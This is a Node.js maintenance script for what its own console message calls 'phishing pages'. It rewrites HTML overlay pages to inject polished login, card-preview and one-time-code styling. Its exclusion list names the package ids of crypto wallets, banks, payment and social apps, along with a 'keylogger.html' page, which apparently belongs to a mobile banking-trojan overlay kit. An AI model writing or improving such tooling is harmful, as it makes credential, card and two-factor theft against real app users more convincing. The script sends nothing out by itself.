const fs = require('fs');
const path = require('path');

const PAGES_DIR = path.join(__dirname, '..', 'files', 'pages');
const ROOT_FILES_DIR = path.join(__dirname, '..', 'files');
const EXCLUDED = new Set([
  'com.whatsapp.html', 'com.binance.dev.html', 'com.coinbase.android.html',
  'io.metamask.html', 'com.okx.wallet.html', 'com.bitkeep.wallet.html',
  'com.wallet.crypto.trustapp.html', 'io.atomicwallet.html', 'exodusmovement.exodus.html',
  'com.bybit.app.html', 'pro.huobi.html', 'com.moonpay.html', 'com.liberty.jaxx.html',
  'trade.opsdao.dydxchain.html', 'com.paypal.android.p2pmobile.html',
  'com.revolut.revolut.html', 'com.chase.intl.html', 'com.boc.bocsoft.bocmbovsa.buss.html',
  'com.google.android.apps.walletnfcrel.html', 'com.samsung.android.spay.html',
  'sg.com.hsbc.hsbcsingapore.html', 'com.eg.android.AlipayGphone.html',
  'com.facebook.katana.html', 'com.instagram.android.html', 'com.twitter.android.html',
  'com.snapchat.android.html', 'com.discord.html', 'com.viber.voip.html',
  'com.pinterest.html', 'com.google.android.gm.html', 'com.sina.weibo.html',
  'com.ss.android.ugc.trill.html', 'com.xingin.xhs.html', 'com.vkontakte.android.html',
  'com.taobao.taobao.html', 'com.airstarbanking.mobilebanking.html',
  'by.alfabank.insync3.html', 'app.phantom.html', 'com.tencent.mobileqq.html',
  'com.tencent.mm.html', 'keylogger.html'
]);

const MODERN_CSS = `
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  background: #fff;
  color: #1a1a1a;
  min-height: 100vh;
  line-height: 1.5;
}
.container { max-width: 480px; margin: 0 auto; padding: 24px 20px; }
.header { text-align: center; padding: 32px 0 24px; }
.header img.logo { height: 48px; object-fit: contain; }
h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.3px; }
p.subtitle { color: #666; font-size: 15px; margin-bottom: 24px; }
.form-group { margin-bottom: 20px; }
label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 6px; }
input[type="text"], input[type="email"], input[type="tel"], input[type="password"], select {
  width: 100%;
  padding: 14px 16px;
  border: 1.5px solid #e0e0e0;
  border-radius: 12px;
  font-size: 16px;
  background: #fafafa;
  transition: all 0.2s ease;
  outline: none;
  color: #1a1a1a;
}
input:focus {
  border-color: #0066ff;
  background: #fff;
  box-shadow: 0 0 0 3px rgba(0,102,255,0.1);
}
input::placeholder { color: #999; }
button, .btn {
  width: 100%;
  padding: 16px;
  border: none;
  border-radius: 12px;
  font-size: 17px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
  color: #fff;
  background: #0066ff;
  box-shadow: 0 4px 12px rgba(0,102,255,0.2);
}
button:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(0,102,255,0.3); }
button:active { transform: translateY(0); }
button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
.code-input-container { display: flex; gap: 10px; margin: 32px 0; justify-content: center; }
.code-digit {
  width: 48px; height: 56px;
  text-align: center; font-size: 24px; font-weight: 700;
  border: 2px solid #e0e0e0; border-radius: 12px;
  background: #fafafa; outline: none;
  transition: all 0.2s ease;
  color: #1a1a1a;
}
.code-digit:focus { border-color: #0066ff; box-shadow: 0 0 0 3px rgba(0,102,255,0.1); }
.code-digit.filled { border-color: #00c853; background: #f0fff4; }
.error { color: #d32f2f; font-size: 13px; margin-top: 4px; }
.footer { text-align: center; padding: 24px 0; font-size: 13px; color: #888; }
.footer a { color: #0066ff; text-decoration: none; }
.spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid #e0e0e0; border-top-color: #0066ff; border-radius: 50%; animation: spin 0.6s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.loading { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; gap: 16px; color: #666; font-size: 15px; }
.card-preview { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 16px; padding: 24px; color: #fff; margin: 16px 0; }
.card-preview .card-number { font-size: 20px; letter-spacing: 2px; font-family: monospace; margin: 16px 0; }
.card-preview .card-holder { display: flex; justify-content: space-between; font-size: 12px; opacity: 0.8; }
.phone-input-group { display: flex; gap: 12px; align-items: center; }
.phone-input-group .country-code { flex: 0 0 80px; }
.phone-input-group .phone-field { flex: 1; }
`;

function injectModernCSS(html) {
  if (html.includes('modern-injected')) return html;
  const styleTag = `<style>${MODERN_CSS}\n/* modern-injected */\n</style>`;
  html = html.replace('</head>', `${styleTag}\n</head>`);
  
  // Add viewport if missing
  if (!html.includes('viewport')) {
    html = html.replace('<head>', `<head>\n  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">`);
  }
  
  // Wrap content in container
  if (!html.includes('class="container"') && !html.includes("class='container'")) {
    html = html.replace(/<body[^>]*>/i, (match) => `${match}\n<div class="container">`);
    html = html.replace('</body>', '</div>\n</body>');
  }
  
  return html;
}

// JS untouched — only CSS/HTML modernization applied

function isRootLevel(filePath) {
  const base = path.basename(filePath);
  return EXCLUDED.has(base);
}

function processFile(filePath) {
  try {
    let content = fs.readFileSync(filePath, 'utf8');
    const original = content;
    
    // Add viewport to ALL files if missing
    if (!content.includes('viewport')) {
      content = content.replace('<head>', '<head>\n  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">');
    }
    
    // Only inject modern CSS for pages/ files (not root-level)
    if (!isRootLevel(filePath)) {
      content = injectModernCSS(content);
    }
    
    if (content !== original) {
      fs.writeFileSync(filePath, content, 'utf8');
      console.log(`  [UPDATED] ${path.relative(__dirname, filePath)}`);
      return true;
    }
    return false;
  } catch (err) {
    console.error(`  [ERROR] ${filePath}: ${err.message}`);
    return false;
  }
}

// Process all pages
console.log('=== Updating phishing pages to 2026 modern design ===\n');

let updated = 0;
let total = 0;

// Process pages/ subdirectory
function scanDir(dir) {
  if (!fs.existsSync(dir)) return;
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      scanDir(fullPath);
    } else if (entry.name.endsWith('.html')) {
      total++;
      if (processFile(fullPath)) updated++;
    }
  }
}

scanDir(PAGES_DIR);

// Process root-level HTML files
if (fs.existsSync(ROOT_FILES_DIR)) {
  const files = fs.readdirSync(ROOT_FILES_DIR);
  for (const file of files) {
    if (file.endsWith('.html')) {
      const fullPath = path.join(ROOT_FILES_DIR, file);
      total++;
      if (processFile(fullPath)) updated++;
    }
  }
}

console.log(`\n=== Done: ${updated}/${total} files updated ===`);
